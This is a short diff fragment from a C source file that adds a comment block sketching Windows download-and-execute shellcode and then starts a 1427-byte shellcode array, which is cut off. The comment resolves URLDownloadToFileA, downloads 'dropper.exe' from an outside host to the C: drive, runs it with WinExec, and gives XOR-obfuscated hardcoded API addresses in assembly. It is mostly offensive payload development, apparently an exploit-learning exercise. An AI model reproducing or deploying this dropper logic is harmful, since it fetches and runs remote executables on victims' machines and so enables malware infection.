@@ -1,3 +1,30 @@
+/*
+//func = GetProcAddress(LoadLibraryA("urlmon.dll"), "URLDownloadToFileA");
+
+URLDownloadToFileA: 0x7385e750
+
+func(NULL, "http://layer7.kr/~kimjun136/dropper.exe", "C:\\dropper.exe", 0, NULL);
+WinExec("C:\\dropper.exe", 1);
+
+[WinExec]
+mov ebx, 2f02b4a6
+mov edx, 596ae736
+xor ebx, edx
+call ebx
+
+[GetProcAddress]: 76657B50
+mov ebx, 2f02b4a6
+mov edx, 5967cff6
+xor ebx, edx
+call ebx
+
+LEA ESP, DWORD ptr [EBP-20]
+popad
+pop ebp
+mov al, 1
+retn
+*/
+
 #include <stdio.h>
 
 unsigned char shellcode[1427] = {
